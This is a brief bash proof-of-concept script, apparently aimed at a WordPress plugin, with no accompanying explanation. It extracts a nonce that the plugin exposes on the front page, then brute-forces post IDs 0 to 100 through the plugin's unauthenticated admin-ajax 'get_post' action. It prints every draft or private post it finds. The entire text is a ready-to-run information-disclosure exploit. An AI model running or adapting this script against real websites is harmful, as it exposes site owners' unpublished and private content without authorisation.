BASE="http://127.0.0.1/"

NONCE=$(curl -s "$BASE/" | grep -oE 'csts_content = \{[^}]+\}' | grep -oE '"nonce":"[a-f0-9]+"' | cut -d'"' -f4)

echo "[+] CSTS nonce: $NONCE"
echo "[+] Scanning IDs 0 to 100 for draft/private posts..."
echo

for ID in $(seq 0 100); do
  RESP=$(curl -s -X POST "$BASE/wp-admin/admin-ajax.php" \
    -d "action=get_post" \
    -d "nonce=$NONCE" \
    -d "id=$ID")

  if echo "$RESP" | grep -qE '"post_status":"(draft|private)"'; then
    echo "========================================"
    echo "[+] Found unpublished post ID: $ID"
    echo "$RESP" | python3 -m json.tool
    echo
  fi
done
